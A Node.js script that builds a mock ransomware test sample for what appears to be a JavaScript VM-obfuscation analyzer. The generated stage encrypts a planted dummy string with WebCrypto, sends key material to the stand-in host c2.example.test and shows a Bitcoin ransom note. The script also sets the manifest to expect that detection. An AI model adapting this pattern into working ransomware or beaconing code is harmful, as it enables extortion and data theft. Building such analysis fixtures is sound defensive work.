#!/usr/bin/env node
/**
 * Regenerate examples/works/22-ransomware-jsvmp/sample.js.
 *
 * A JSVMP-protected ransomware stage: the obfuscated VM executes an encoded
 * bytecode program, then the surrounding stage encrypts local data with
 * WebCrypto, renders a ransom note and beacons key material.
 */
import { readFile, writeFile } from 'node:fs/promises'
import { fileURLToPath } from 'node:url'
import { buildVM, buildSampleProgram } from '../../tools/jsvmp/index.js'

const directory = fileURLToPath(new URL('./22-ransomware-jsvmp/', import.meta.url))
const vm = buildVM(buildSampleProgram(), { seed: 2222, name: '__ransom_vm', obfuscate: true })

const header = `// Generated by examples/works/build-ransomware-jsvmp.mjs — do not edit by hand.
// JSVMP-protected ransomware stage: obfuscated dispatch loop + WebCrypto.
`
const body = `
(function () {
  try {
    var vmResult = __ransom_vm();
    console.log('[RANSOMVM] bytecode result', vmResult);
  } catch (error) {}
  try { localStorage.setItem('finance-q4', 'quarterly-forecast-confidential'); } catch (error) {}
  var subtle = window.crypto && window.crypto.subtle ? window.crypto.subtle : null;
  if (!subtle) return;
  var raw = new Uint8Array(32);
  try { crypto.getRandomValues(raw); } catch (error) {}
  subtle.importKey('raw', raw, { name: 'AES-GCM' }, true, ['encrypt', 'exportKey'])
    .then(function (key) {
      var iv = new Uint8Array(12);
      try { crypto.getRandomValues(iv); } catch (error) {}
      return subtle.encrypt({ name: 'AES-GCM', iv: iv }, key, new TextEncoder().encode('quarterly-forecast-confidential'))
        .then(function (cipher) { return subtle.exportKey('raw', key).then(function (exported) { return { cipher: cipher, exported: exported, iv: iv }; }); });
    })
    .then(function (result) {
      var keyId = btoa(String.fromCharCode.apply(null, new Uint8Array(result.exported))).slice(0, 16);
      try {
        fetch('https://c2.example.test/ransom', { method: 'POST', body: btoa(JSON.stringify({ keyId: keyId, size: result.cipher.byteLength, iv: Array.from(result.iv) })) }).catch(function () {});
      } catch (error) {}
      try { localStorage.setItem('ransomvm:keyid', keyId); } catch (error) {}
      try {
        var note = document.createElement('div');
        note.id = 'ransomvm-note';
        note.innerHTML = '<h1>Files encrypted</h1><p>Key ID: ' + keyId + '</p><p>Pay 0.5 BTC to bc1qexampleransomvmaddress</p>';
        document.body.appendChild(note);
      } catch (error) {}
      console.log('[RANSOMVM] encrypted', result.cipher.byteLength, 'bytes');
    })
    .catch(function (error) { console.log('[RANSOMVM] crypto failed', error.message); });
})();
`
await writeFile(`${directory}sample.js`, header + vm.code + body)
const manifestPath = `${directory}work.json`
const manifest = JSON.parse(await readFile(manifestPath, 'utf8'))
manifest.expect.requireVm = true
manifest.verify = { command: `node tools/cli.js analyze examples/works/22-ransomware-jsvmp/sample.js --json`, expect: 'tracing.jsvmp.detected' }
await writeFile(manifestPath, JSON.stringify(manifest, null, 2) + '\n')
let readme = await readFile(`${directory}README.md`, 'utf8')
readme += '\n## 8. 生成与 JSVMP 分析\n\n本样本由平台 `tools/jsvmp` builder 生成（obfuscated opcode cipher + 编码常量池）：\n\n```bash\nnode examples/works/build-ransomware-jsvmp.mjs\nnode examples/works/run-all.mjs --filter 22\n```\n\n`run-all.mjs` 根据 `expect.requireVm` 启用 `instrumentation: { jsvmp: true }`，预期 `tracing.jsvmp.detected=true` 并产生数百条 `jsvmp:opcode` 事件。\n'
await writeFile(`${directory}README.md`, readme)
console.log('ransomware JSVMP sample generated:', vm.opcodes.length, 'opcodes')
